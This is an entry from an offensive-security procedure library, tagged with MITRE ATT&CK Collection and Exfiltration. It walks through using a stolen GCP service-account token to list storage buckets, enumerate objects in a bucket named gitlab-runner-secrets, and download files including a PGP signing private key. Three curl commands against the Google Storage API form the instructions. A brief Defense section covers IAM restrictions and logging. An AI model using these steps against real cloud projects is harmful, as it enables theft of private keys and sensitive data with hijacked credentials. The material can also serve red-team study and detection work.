---
id: proc-uuid-6
tags:
  - bucket-enum
  - data-exfil
  - gcp-storage
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Collection]]'
  - '[[Exfiltration]]'
commands:
  - '[[commands/curl-list-gcp-buckets]]'
  - '[[commands/curl-list-bucket-objects]]'
  - '[[commands/curl-download-bucket-contents]]'
verified: false
platforms:
  - GCP
  - Cloud
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Cloud Instance Metadata API]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T03:46:09.540Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
  - '[[Exfiltration]]'
mitre_techniques:
  - '[[Cloud Instance Metadata API]]'
  - '[[File and Directory Discovery]]'
---
# Enumerate-and-Access-GCP-Storage-Buckets

## Summary

Use the stolen token and project ID to list GCP storage buckets, enumerate objects within them, and download sensitive files like private keys and runtime metrics.

## Description

Query the Storage API to list buckets (e.g., gitlab-ci-usage-outputs, gitlab-runner-secrets), then objects in gitlab-runner-secrets (e.g., package_signing.gpg with PGP private key), and download from gitlab-ci-usage-outputs containing compute metrics and instance details.

## Requirements

1. Service account token and project ID
2. Scopes including devstorage.read_only
3. curl for API requests

## Defense

- Apply IAM policies restricting service account access to buckets
- Enable bucket logging and monitor API calls for enumeration
- Use customer-managed encryption keys for sensitive data

## Objectives

1. Discover internal storage resources
2. Exfiltrate private keys and metrics
3. Assess infrastructure compromise

## Instructions

### Step 1: List All Buckets

**Context**: Enumerate buckets in the project.

**Command** ([[commands/curl-list-gcp-buckets]]):
```bash
curl https://www.googleapis.com/storage/v1/b?access_token=xxx&project=gitlab-ci-155816
```

> Expected: JSON array of buckets with names and locations.

### Step 2: List Objects in Specific Bucket

**Context**: Target sensitive bucket.

**Command** ([[commands/curl-list-bucket-objects]]):
```bash
curl https://www.googleapis.com/storage/v1/b/gitlab-runner-secrets/o?access_token=xxxx
```

> Expected: Objects like package_signing.gpg.

### Step 3: Download Bucket Contents

**Context**: Exfiltrate files.

**Command** ([[commands/curl-download-bucket-contents]]):
```bash
curl https://www.googleapis.com/download/storage/v1/b/gitlab-ci-usage-outputs/o/FILE_NAME?alt=media&access_token=xxxx
```

> Download specific files; expected: Metrics data, private keys.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]
- [[Exfiltration]]

### Techniques

- [[Cloud Instance Metadata API]]
- [[File and Directory Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/curl-list-gcp-buckets]]
- [[commands/curl-list-bucket-objects]]
- [[commands/curl-download-bucket-contents]]

## Tools Used

- [[tools/curl]]

## Tags

- bucket-enum
- gcp-storage
